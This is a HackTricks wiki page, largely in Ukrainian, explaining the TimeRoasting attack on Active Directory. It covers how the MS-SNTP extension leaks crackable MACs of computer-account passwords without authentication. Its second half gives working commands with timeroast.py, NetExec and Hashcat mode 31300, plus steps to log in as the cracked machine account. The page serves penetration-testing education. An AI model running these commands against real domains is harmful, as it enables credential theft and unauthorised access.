# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting зловживає legacy authentication extension MS-SNTP. У MS-SNTP client може надіслати 68-байтовий request, що містить RID будь-якого computer account; domain controller використовує NTLM hash (MD4) computer account як key для обчислення MAC над response і повертає його.<sup>[[1]](#references)</sup> Attackers можуть збирати ці MS-SNTP MAC без authentication і crack їх offline (Hashcat mode 31300), щоб відновити passwords computer accounts.<sup>[[2]](#references)</sup>

Докладніше див. section 3.1.5.1 "Authentication Request Behavior" і 4 "Protocol Examples" в official MS-SNTP spec.<sup>[[1]](#references)</sup>
![TimeRoasting: Докладніше див. section 3.1.5.1 "Authentication Request Behavior" і 4 "Protocol Examples" в official MS-SNTP spec](../../images/Pasted%20image%2020250709114508.png)
Коли ADM element ExtendedAuthenticatorSupported має значення false, client надсилає 68-байтовий request і вбудовує RID у найменш значущі 31 біт підполя Key Identifier authenticator.<sup>[[1]](#references)</sup>

> Якщо ADM element ExtendedAuthenticatorSupported має значення false, client MUST construct Client NTP Request message. Довжина Client NTP Request message становить 68 bytes. Client встановлює Authenticator field Client NTP Request message, як описано в section 2.2.1, записуючи найменш значущі 31 біт значення RID у найменш значущі 31 біт підполя Key Identifier authenticator, а потім записуючи значення Key Selector у найбільш значущий біт підполя Key Identifier.<sup>[[1]](#references)</sup>

З section 4 (Protocol Examples):

> After receiving the request, server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, server extracts RID from the received message. Server uses it to call NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. Server then sends a response to client, setting Key Identifier field to 0 and Crypto-Checksum field to the computed crypto-checksum.<sup>[[1]](#references)</sup>

Crypto-checksum базується на MD5 (див. 3.2.5.1.1) і може бути cracked offline, що робить можливим roasting attack.<sup>[[1]](#references)</sup>

## Як атакувати

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Практична атака (без автентифікації) з NetExec + Hashcat

- NetExec може enumerate та збирати MS-SNTP MAC-адреси для computer RID без автентифікації й виводити хеші `$sntp-ms$`, готові до cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Виконати offline-cracking за допомогою Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Відновлений пароль у відкритому тексті відповідає паролю облікового запису комп'ютера. Спробуйте використати його безпосередньо як обліковий запис машини через Kerberos (-k), коли NTLM вимкнено:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Операційні поради
- Забезпечте точну синхронізацію часу перед використанням Kerberos: `sudo ntpdate <dc_fqdn>`
- За потреби згенеруйте krb5.conf для AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Пізніше зіставте RID із principals через LDAP/BloodHound, коли отримаєте будь-який authenticated foothold.

## Посилання

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – білий документ про Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – офіційна документація](https://www.netexec.wiki/)
- [5] [Режим Hashcat 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
